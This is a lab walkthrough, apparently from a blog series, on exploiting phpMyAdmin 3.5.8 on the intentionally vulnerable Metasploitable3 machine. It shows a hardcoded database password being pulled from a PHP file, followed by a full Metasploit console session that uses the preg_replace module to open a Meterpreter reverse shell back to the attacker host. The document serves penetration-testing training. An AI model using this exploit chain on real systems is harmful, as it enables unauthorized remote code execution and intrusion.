---
title: phpMyAdmin Authenticated Remote Code Execution via preg_replace() 
date: 2024-02-18
description:  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
tags: 
    - metasploitable3
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
---

 phpMyAdmin Authenticated Remote Code Execution via preg_replace()

After performing SQL Injection using SQLmap, use the credentials that has been retrieved and login into the Metasploitable3 via SSH. Navigate to the var/www/html directory to locate the Apache web server documents. Open the payroll_app.php and explore the file to retrieve login credentials.

```php
$conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');
```
Username: root

Password: sploitme


 ```shell
 [msf](Jobs:0 Agents:0) >> search phpMyAdmin Authenticated Remote Code Execution

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   1  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
   2  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
   3  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/phpmyadmin_preg_replace

[msf](Jobs:0 Agents:0) >> use 3
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> show options

Module options (exploit/multi/http/phpmyadmin_preg_replace):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
                                         oit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set RHOST 10.0.2.28
RHOST => 10.0.2.28
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set LHOST 10.0.2.16
LHOST => 10.0.2.16
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> set PASSWORD sploitme
PASSWORD => sploitme
[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_preg_replace) >> run

[*] Started reverse TCP handler on 10.0.2.16:4444 
[*] phpMyAdmin version: 3.5.8
[*] The target appears to be vulnerable.
[*] Grabbing CSRF token...
[+] Retrieved token
[*] Authenticating...
[+] Authentication successful
[*] Sending stage (39927 bytes) to 10.0.2.28
[*] Meterpreter session 1 opened (10.0.2.16:4444 -> 10.0.2.28:33549) at 2024-03-05 13:41:26 +0000

(Meterpreter 1)(/var/www/html/phpmyadmin) > pwd
/var/www/html/phpmyadmin
(Meterpreter 1)(/var/www/html/phpmyadmin) > getuid
Server username: www-data

 ```